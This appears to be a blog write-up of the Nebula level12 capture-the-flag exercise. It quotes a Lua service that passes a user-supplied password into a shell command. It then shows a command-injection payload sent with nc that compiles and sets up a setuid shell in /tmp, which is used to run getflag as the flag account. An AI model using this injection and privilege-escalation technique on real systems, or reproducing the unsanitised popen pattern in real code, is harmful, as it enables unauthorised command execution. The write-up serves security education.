+++
author = "pwntester"
categories = ["nebula12"]
date = 2013-11-24T20:37:00Z
description = ""
draft = false
slug = "nebula-level12-write-up"
tags = ["nebula12"]
title = "Nebula level12 write-up"

+++

In [Level12](http://exploit-exercises.com/nebula/level12) we are given the following code:

```lang-clike line-numbers 
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print("trying " .. line) -- log from where ;\
    local h = hash(line)

    if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
    else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
    end

  end

  client:close()
end
```

We have a command injection as the **password** variable can be controlled by the user and it is used to create a command that will be run in the system. All we need to do is inject our commands. In this case, we will be using the shell wrapper shown in **level 11**:

```lang-bash line-numbers 
level12@nebula:~$ nc localhost 50001
Password: 1; gcc -o /tmp/shell /tmp/shell.c; chmod +s /tmp/shell; echo 1
Better luck next time
level12@nebula:~$ ls -la /tmp
total 32
drwxrwxrwt  4 root    root    4096 Nov 24 12:37 .
drwxr-xr-x 22 root    root    4096 Dec  6  2011 ..
-rwsr-sr-x  1 flag12  flag12  7241 Nov 24 12:43 shell
-rw-rw-r--  1 level11 level11  180 Nov 24 11:48 shell.c
```

Now lets run our shell and get the flag:

```lang-bash line-numbers 
level12@nebula:~$ cd /tmp
level12@nebula:/tmp$ ./shell
sh-4.2$ id
uid=987(flag12) gid=1013(level12) egid=987(flag12) groups=987(flag12),1013(level12)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

Voila !!
